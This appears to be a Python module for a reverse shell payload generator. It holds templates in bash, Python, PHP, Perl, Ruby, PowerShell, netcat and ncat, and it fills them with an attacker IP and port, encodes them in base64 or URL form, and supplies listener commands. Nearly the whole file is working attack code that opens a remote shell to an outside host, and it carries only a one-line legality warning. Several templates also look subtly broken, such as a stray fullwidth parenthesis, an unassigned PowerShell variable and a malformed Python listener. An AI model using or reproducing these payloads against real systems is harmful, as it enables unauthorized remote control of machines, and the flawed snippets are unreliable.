"""
Reverse Shell Generator Module
Generate payloads for various languages and platforms
"""

import base64
import urllib.parse
from typing import Dict, Any, Optional


class RevShellGenerator:
    """Generate reverse shell payloads"""
    
    # Shell templates for different languages
    PAYLOADS = {
        "bash": {
            "linux": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "macos": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "windows": None  # Bash not native on Windows
        },
        "python": {
            "linux": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            "macos": '''python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])' ''',
            "windows": '''python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['cmd.exe','/K']）"'''
        },
        "php": {
            "linux": '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            "macos": '''php -r '$sock=fsockopen("{ip}",{port});exec("/bin/sh -i <&3 >&3 2>&3");' ''',
            "windows": '''php -r '$sock=fsockopen("{ip}",{port});exec("cmd.exe /K <&3 >&3 2>&3");' '''
        },
        "perl": {
            "linux": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            "macos": '''perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};' ''',
            "windows": None
        },
        "ruby": {
            "linux": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
            "macos": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)' ''',
            "windows": '''ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("cmd.exe /K <&%d >&%d 2>&%d",f,f,f)' '''
        },
        "powershell": {
            "linux": None,
            "macos": None,
            "windows": '''powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()'''
        },
        "netcat": {
            "linux": "nc -e /bin/sh {ip} {port}",
            "macos": "nc {ip} {port} -e /bin/sh",
            "windows": "nc.exe -e cmd.exe {ip} {port}"
        },
        "ncat": {
            "linux": "ncat {ip} {port} -e /bin/sh",
            "macos": "ncat {ip} {port} -e /bin/sh",
            "windows": "ncat.exe {ip} {port} -e cmd.exe"
        }
    }
    
    def __init__(self):
        self.languages = list(self.PAYLOADS.keys())
        self.platforms = ["linux", "windows", "macos"]
    
    def generate(self, language: str, platform: str, attacker_ip: str, 
                 attacker_port: int, encode: Optional[str] = None) -> Dict[str, Any]:
        """
        Generate reverse shell payload
        
        Args:
            language: Programming language (bash, python, php, etc.)
            platform: Target platform (linux, windows, macos)
            attacker_ip: Attacker IP address
            attacker_port: Attacker port number
            encode: Optional encoding (base64, url)
        
        Returns:
            Dictionary with payload and listener command
        """
        language = language.lower()
        platform = platform.lower()
        
        if language not in self.PAYLOADS:
            raise ValueError(f"Unsupported language: {language}")
        
        if platform not in self.PAYLOADS[language]:
            raise ValueError(f"Unsupported platform {platform} for {language}")
        
        payload_template = self.PAYLOADS[language][platform]
        if payload_template is None:
            raise ValueError(f"{language} is not supported on {platform}")
        
        # Format payload
        payload = payload_template.format(ip=attacker_ip, port=attacker_port)
        
        # Apply encoding if requested
        encoded_payload = payload
        if encode:
            if encode.lower() == "base64":
                encoded_payload = base64.b64encode(payload.encode()).decode()
            elif encode.lower() == "url":
                encoded_payload = urllib.parse.quote(payload)
            elif encode.lower() == "doubleurl":
                encoded_payload = urllib.parse.quote(urllib.parse.quote(payload))
        
        # Generate listener command
        listener = self._generate_listener(attacker_port)
        
        return {
            "language": language,
            "platform": platform,
            "attacker_ip": attacker_ip,
            "attacker_port": attacker_port,
            "payload": payload,
            "encoded_payload": encoded_payload if encode else None,
            "encoding": encode,
            "listener_command": listener,
            "warning": "For authorized security testing only. Unauthorized access is illegal."
        }
    
    def _generate_listener(self, port: int) -> Dict[str, str]:
        """Generate netcat listener commands"""
        return {
            "netcat": f"nc -lvnp {port}",
            "ncat": f"ncat -lvnp {port}",
            "socat": f"socat TCP-LISTEN:{port},fork -",
            "python": f"python3 -c 'import socket,subprocess;s=socket.socket();s.bind(\"0.0.0.0\",{port});s.listen(1);c,a=s.accept();subprocess.call([\"/bin/sh\",\"-i\"],stdin=c,stdout=c,stderr=c)'",
            "pwncat": f"pwncat-cs -lp {port}"
        }
    
    def get_available_payloads(self) -> Dict[str, Any]:
        """Get list of available payloads by language and platform"""
        available = {}
        for lang, platforms in self.PAYLOADS.items():
            available[lang] = {
                plat: plat_cap for plat, plat_cap in platforms.items() 
                if plat_cap is not None
            }
        return available


if __name__ == "__main__":
    gen = RevShellGenerator()
    
    # Test payload generation
    result = gen.generate("bash", "linux", "10.10.10.10", 4444)
    print(f"Bash payload: {result['payload']}")
    print(f"Listener: {result['listener_command']}")
    
    # Test with encoding
    result_encoded = gen.generate("python", "linux", "10.10.10.10", 4444, encode="base64")
    print(f"\nEncoded payload: {result_encoded['encoded_payload']}")
